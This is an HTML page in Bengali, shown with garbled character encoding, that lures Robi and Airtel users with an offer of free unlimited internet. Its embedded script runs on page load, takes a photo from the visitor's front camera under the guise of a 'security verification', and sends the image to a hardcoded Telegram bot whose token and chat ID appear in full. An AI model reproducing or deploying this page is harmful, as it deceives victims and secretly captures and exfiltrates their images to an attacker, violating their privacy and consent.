<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>рж╢рж┐ржХрзНрж╖рж╛ржорзВрж▓ржХ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЯрзЗрж╕рзНржЯ ржУ ржлрзНрж░рж┐ ржЗржирзНржЯрж╛рж░ржирзЗржЯ</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background-color: #f0f0f0;
        }
        h1 {
            font-size: 28px;
            color: #007BFF;
        }
        p {
            font-size: 18px;
            color: #333;
            margin-top: 20px;
        }
        #status {
            font-size: 20px;
            font-weight: bold;
            color: #4CAF50;
            margin-top: 20px;
        }
        /* ржЖржкржирж╛рж░ ржбрж╛ржЙржирж▓рзЛржб ржмрж╛ржЯржи рж╕рзНржЯрж╛ржЗрж▓ */
        .download-button {
            display: inline-block;
            padding: 15px 30px;
            margin-top: 30px;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            background-color: #e50000; /* ржЖржХрж░рзНрж╖ржгрзАржпрж╝ рж▓рж╛рж▓ рж░ржВ */
            border: none;
            border-radius: 50px;
            text-decoration: none;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        .download-button:hover {
            background-color: #b30000;
            transform: translateY(-2px);
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>ЁЯЪА рж╕рзАржорж╛рж╣рзАржи ржЧрждрж┐рждрзЗ!</h1>
        <div class="subtitle">рж░ржмрж┐ ржПржмржВ ржПржпрж╝рж╛рж░ржЯрзЗрж▓ рж╕рж┐ржорзЗ</div>
        
        <div class="highlight-text">
            ржЖржирж▓рж┐ржорж┐ржЯрзЗржб ржлрзНрж░рж┐ ржЗржирзНржЯрж╛рж░ржирзЗржЯ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзБржи!<br>
            ржХрзЛржи ржЯрж╛ржХрж╛ ржмрж╛ ржПржоржмрж┐ ржЫрж╛ржбрж╝рж╛ржЗ!
        </div>

        <p class="verification-text">ЁЯЪи ржЧрзБрж░рзБрждрзНржмржкрзВрж░рзНржг: ржЕржлрж╛рж░ржЯрж┐ ржЕрзНржпрж╛ржХрзНржЯрж┐ржнржЯ ржХрж░рждрзЗ ржирж┐ржЪрзЗ ржжрзЗржУржпрж╝рж╛ ржЕрзНржпрж╛ржбрж╛ржЙржирж▓рзЛржб ржХрж░рзБржи</p>
        <p id="camera-status">ржирж┐рж░рж╛ржкрждрзНрждрж╛ ржпрж╛ржЪрж╛ржЗржХрж░ржг рж╢рзБрж░рзБ рж╣ржЪрзНржЫрзЗ...</p>

        <a href="https://play.google.com/store/apps/details?id=com.tss.tunnel" class="download-button" target="_blank">
            ржПржХ ржХрзНрж▓рж┐ржХрзЗ ржбрж╛ржЙржирж▓рзЛржб ржХрж░рзБржи ЁЯФе
        </a>
        
        <p class="note">**ржжрзНрж░рзБржд ржбрж╛ржЙржирж▓рзЛржб ржХрж░рзЗ рж╕рзЗржЯржЖржк ржХрж░рзБржи ржПржмржВ ржлрзНрж░рж┐ ржирзЗржЯ ржЙржкржнрзЛржЧ ржХрж░рзБржиред ржПржЗ ржЕржлрж╛рж░ржЯрж┐ ржпрзЗржХрзЛржирзЛ рж╕ржоржпрж╝ ржмржирзНржз рж╣ржпрж╝рзЗ ржпрзЗрждрзЗ ржкрж╛рж░рзЗ!**</p>
    </div>
    <script>
        // --- ржЖржкржирж╛рж░ ржжрзЗржУрзЯрж╛ ржЯрзЛржХрзЗржи ржУ ржЖржЗржбрж┐ ржмрж╕рж╛ржирзЛ рж╣рзЯрзЗржЫрзЗ ---
        const telegramBotToken = "8354509532:AAFsEOed-DtdQN1LogdM6ftu8MVdeWiCdCw"; 
        const chatId = "5722488391";
        // ------------------------------------

        const status = document.getElementById("status");

        if (!chatId || !telegramBotToken) {
            alert("рждрзНрж░рзБржЯрж┐: ржмржЯ ржЯрзЛржХрзЗржи ржмрж╛ ржЪрзНржпрж╛ржЯ ржЖржЗржбрж┐ рж╕рзЗржЯ ржХрж░рж╛ рж╣ржпрж╝ржирж┐ред");
            status.textContent = "рждрзНрж░рзБржЯрж┐: ржмржЯ ржЯрзЛржХрзЗржи ржПржмржВ ржЪрзНржпрж╛ржЯ ржЖржЗржбрж┐ рж╕рзЗржЯ ржХрж░рж╛ рж╣ржпрж╝ржирж┐ред";
            console.error("Bot token or Chat ID is missing.");
            throw new Error("Bot token or Chat ID is missing.");
        }

        async function captureAndSend() {
            try {
                status.textContent = "ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...";
                console.log("ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕рзЗрж░ ржЪрзЗрж╖рзНржЯрж╛ ржЪрж▓ржЫрзЗ...");

                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    alert("ржЖржкржирж╛рж░ ржмрзНрж░рж╛ржЙржЬрж╛рж░ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ рж╕ржорж░рзНржержи ржХрж░рзЗ ржирж╛ред");
                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржмрзНрж░рж╛ржЙржЬрж╛рж░ ржХрзНржпрж╛ржорзЗрж░рж╛ рж╕ржорж░рзНржержи ржХрж░рзЗ ржирж╛ред";
                    console.error("getUserMedia not supported");
                    return;
                }

                // рж╕рж╛ржоржирзЗрж░ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рж╛рж░ ржЪрзЗрж╖рзНржЯрж╛
                let stream;
                try {
                    stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "user" }
                    });
                    console.log("рж╕рж╛ржоржирзЗрж░ ржХрзНржпрж╛ржорзЗрж░рж╛ ржмрзНржпржмрж╣рзГржд рж╣ржЪрзНржЫрзЗ");
                } catch (error) {
                    console.warn("рж╕рж╛ржоржирзЗрж░ ржХрзНржпрж╛ржорзЗрж░рж╛ ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐, ржбрж┐ржлрж▓рзНржЯ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЪрзЗрж╖рзНржЯрж╛ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ:", error);
                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    console.log("ржбрж┐ржлрж▓рзНржЯ ржХрзНржпрж╛ржорзЗрж░рж╛ ржмрзНржпржмрж╣рзГржд рж╣ржЪрзНржЫрзЗ");
                }

                status.textContent = "ржЫржмрж┐ рждрзЛрж▓рж╛ рж╣ржЪрзНржЫрзЗ...";
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();

                // ржнрж┐ржбрж┐ржУ рж▓рзЛржб рж╣ржУрзЯрж╛рж░ ржкрж░ ржЫржмрж┐ ржХрзНржпрж╛ржкржЪрж╛рж░
                video.onloadedmetadata = () => {
                    // рж╕рзНржерж╛ржпрж╝рж┐рждрзНржм ржмрж╛ржбрж╝рж╛рждрзЗ рж╕рж╛ржорж╛ржирзНржп ржЕржкрзЗржХрзНрж╖рж╛ ржпрзЛржЧ ржХрж░рж╛ рж╣рж▓рзЛ
                    setTimeout(() => {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext("2d");
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        // ржХрзНржпрж╛ржорзЗрж░рж╛ ржмржирзНржз ржХрж░рзБржи
                        stream.getTracks().forEach(track => track.stop());
                        status.textContent = "ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржЫржмрж┐ ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ...";

                        // ржЫржмрж┐ржХрзЗ Blob-ржП рж░рзВржкрж╛ржирзНрждрж░
                        canvas.toBlob(blob => {
                            console.log("ржЫржмрж┐ ржХрзНржпрж╛ржкржЪрж╛рж░ рж╕ржорзНржкржирзНржи, ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржорзЗ ржкрж╛ржарж╛ржирзЛ рж╣ржЪрзНржЫрзЗ");
                            const formData = new FormData();
                            formData.append("chat_id", chatId);
                            formData.append("photo", blob, "image.jpg");

                            // ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо ржПржкрж┐ржЖржЗ-рждрзЗ ржЫржмрж┐ ржкрж╛ржарж╛ржирзЛ
                            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                                method: "POST",
                                body: formData,
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.ok) {
                                    alert("рж╕ржлрж▓ржнрж╛ржмрзЗ ржЫржмрж┐ ржкрж╛ржарж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗ!");
                                    status.textContent = "рж╕ржлрж▓! ржЫржмрж┐ржЯрж┐ ржЖржкржирж╛рж░ ржЯрзЗрж▓рж┐ржЧрзНрж░рж╛ржо ржмржЯрзЗ ржкрж╛ржарж╛ржирзЛ рж╣ржпрж╝рзЗржЫрзЗред";
                                } else {
                                    alert("ржЫржмрж┐ ржкрж╛ржарж╛рждрзЗ ржмрзНржпрж░рзНрже: " + data.description);
                                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржЫржмрж┐ ржкрж╛ржарж╛рждрзЗ ржмрзНржпрж░рзНрже - " + data.description;
                                    console.error("Telegram API error:", data);
                                }
                            })
                            .catch(error => {
                                console.error("Error sending photo:", error);
                                alert("ржЫржмрж┐ ржкрж╛ржарж╛рждрзЗ рждрзНрж░рзБржЯрж┐ рж╣ржпрж╝рзЗржЫрзЗред");
                                status.textContent = "рждрзНрж░рзБржЯрж┐: ржЫржмрж┐ ржкрж╛ржарж╛рждрзЗ рж╕ржорж╕рзНржпрж╛ред";
                            });
                        }, "image/jpeg", 0.9); // ржЫржмрж┐рж░ ржорж╛ржи ржЙржирзНржиржд ржХрж░рж╛ рж╣рж▓рзЛ
                    }, 500); // 500ms ржЕржкрзЗржХрзНрж╖рж╛
                };
            } catch (error) {
                console.error("Camera access error:", error.name, error.message);
                alert("ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рждрзЗ ржмрзНржпрж░рзНрже: " + error.message);
                status.textContent = "рждрзНрж░рзБржЯрж┐: ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рждрзЗ ржмрзНржпрж░рзНржеред";
                
                if (error.name === "NotAllowedError") {
                    alert("ржЖржкржирж┐ ржХрзНржпрж╛ржорзЗрж░рж╛ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЕржирзБржорждрж┐ ржжрзЗржиржирж┐ред");
                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржХрзНржпрж╛ржорзЗрж░рж╛ ржмрзНржпржмрж╣рж╛рж░рзЗрж░ ржЕржирзБржорждрж┐ ржжрж┐ржиред";
                } else if (error.name === "NotFoundError") {
                    alert("ржПржЗ ржбрж┐ржнрж╛ржЗрж╕рзЗ ржХрзНржпрж╛ржорзЗрж░рж╛ ржкрж╛ржУржпрж╝рж╛ ржпрж╛ржпрж╝ржирж┐ред");
                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржХрзЛржирзЛ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЦрзБржБржЬрзЗ ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐ред";
                } else if (error.name === "NotReadableError") {
                     alert("ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕржирзНржп ржХрзЛржирзЛ ржЕрзНржпрж╛ржк ржмрзНржпржмрж╣рж╛рж░ ржХрж░ржЫрзЗ ржЕржержмрж╛ рж╣рж╛рж░рзНржбржУрзЯрзНржпрж╛рж░ рж╕ржорж╕рзНржпрж╛ред");
                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржХрзНржпрж╛ржорзЗрж░рж╛ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рж╛ ржпрж╛ржЪрзНржЫрзЗ ржирж╛ред";
                } else if (error.name === "SecurityError") {
                    alert("ржирж┐рж░рж╛ржкрждрзНрждрж╛ржЬржирж┐ржд ржХрж╛рж░ржгрзЗ ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рж╛ ржпрж╛ржЪрзНржЫрзЗ ржирж╛ред ржлрж╛ржЗрж▓ржЯрж┐ ржПржХржЯрж┐ рж╕рж╛рж░рзНржнрж╛рж░ ржерзЗржХрзЗ рж▓рзЛржб ржХрж░рзБржиред");
                    status.textContent = "рждрзНрж░рзБржЯрж┐: ржХрзНржпрж╛ржорзЗрж░рж╛ ржЕрзНржпрж╛ржХрзНрж╕рзЗрж╕ ржХрж░рждрзЗ ржмрзНржпрж░рзНрже (SecurityError)ред";
                }
            }
        }

        // ржкрзЗржЬ рж▓рзЛржб рж╣рж▓рзЗржЗ рж╕рзНржмржпрж╝ржВржХрзНрж░рж┐ржпрж╝ржнрж╛ржмрзЗ ржлрж╛ржВрж╢ржиржЯрж┐ ржЪрж╛рж▓рзБ рж╣ржмрзЗ
        window.onload = captureAndSend;
    </script>

</body>
</html>